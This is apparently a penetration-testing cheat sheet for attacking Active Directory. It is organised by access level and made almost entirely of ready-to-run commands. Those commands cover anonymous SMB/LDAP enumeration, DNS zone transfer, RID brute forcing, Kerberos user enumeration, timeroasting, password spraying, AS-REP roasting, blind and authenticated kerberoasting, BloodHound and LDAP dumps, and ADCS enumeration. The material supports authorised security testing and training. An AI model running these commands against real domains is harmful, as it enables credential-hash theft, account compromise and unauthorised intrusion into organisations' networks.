---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: false
---

# Active Directory Methodology

## No credentials

### Enumeration

```sh
nxc smb $TARGET
enum4linux -a $TARGET
nmap -n -sV --script "ldap* and not brute" -p 389 $DC_IP
ldapsearch -x -H $DC_IP -s base
```

### Zone transfer

{% code overflow="wrap" %}
```sh
dig axfr $DOMAIN @$DC_IP
```
{% endcode %}

### Shares

```sh
nxc smb $DC_IP -u '' -p '' --shares
nxc smb $DC_IP -u 'guest' -p '' --shares
```

### Enumerate users

{% code overflow="wrap" %}
```sh
nxc smb $DC_IP --users
nxc smb $DC_IP --rid-brute 10000
```
{% endcode %}

```sh
kerbrute userenum -d $DOMAIN $USERS_FILE
```

### Timeroast

{% code overflow="wrap" %}
```sh
timeroast.py $DC_IP
```
{% endcode %}

## Valid user (no password)

### Password spray

{% code overflow="wrap" %}
```sh
nxc smb $DC_IP -u $USERS_FILE -p $PASSWORDS_FILE --no-bruteforce --continue-on-success
```
{% endcode %}

### ASREP Roast <a href="#asreproast" id="asreproast"></a>

{% code overflow="wrap" %}
```sh
nxc ldap $DC_IP -u $USERS_FILE -p '' --asreproast $OUTPUT_FILE
```
{% endcode %}

{% code overflow="wrap" %}
```sh
GetNPUsers.py $DOMAIN/ -usersfile $USERS_FILE
```
{% endcode %}

### Blind kerberoast

{% code overflow="wrap" %}
```sh
GetUserSPNs.py -no-preauth $ASREP_USER -usersfile $USERS_FILE -dc-host $DC_IP $DOMAIN/
```
{% endcode %}

## Valid credentials

### List all users

{% code overflow="wrap" %}
```sh
nxc smb $DC_IP -u $USERNAME -p $PASSWORD --users
```
{% endcode %}

### Enumerate SMB shares

{% code overflow="wrap" %}
```sh
nxc smb $DC_IP -u $USERNAME -p $PASSWORD -M spider_plus
```
{% endcode %}

{% code overflow="wrap" %}
```sh
smbclient.py $USERNAME:$PASSWORD>@$DC_IP
```
{% endcode %}

### BloodHound

{% code overflow="wrap" %}
```sh
bloodhound-ce-python -d $DOMAIN -u $USERNAME -p $PASSWORD [-ns $DC_IP] -c All --zip
```
{% endcode %}

### Enumerate LDAP

{% code overflow="wrap" %}
```sh
ldapdomaindump.py -u $DOMAIN\$USERNAME -p $PASSWORD -o $OUTPUT_FOLDER $DC_IP
```
{% endcode %}

### Enumerate ADCS

{% code overflow="wrap" %}
```sh
certipy find -u $USERNAME@$DOMAIN -p $PASSWORD -dc-ip $DC_IP -stdout
```
{% endcode %}

### Kerberoast

{% code overflow="wrap" %}
```sh
nxc ldap $DC_IP -u $USERNAME -p $PASSWORD --kerberoasting $OUTPUT_FILE
```
{% endcode %}

{% code overflow="wrap" %}
```sh
GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD
```
{% endcode %}

{% hint style="danger" %}
If you find this error from Linux: `KRB_AP_ERR_SKEW(Clock skew too great)` it's because of your local time, you need to synchronise the host with the DC.

{% code overflow="wrap" fullWidth="false" %}
```sh
sudo ntpdate $DC_IP
```
{% endcode %}
{% endhint %}

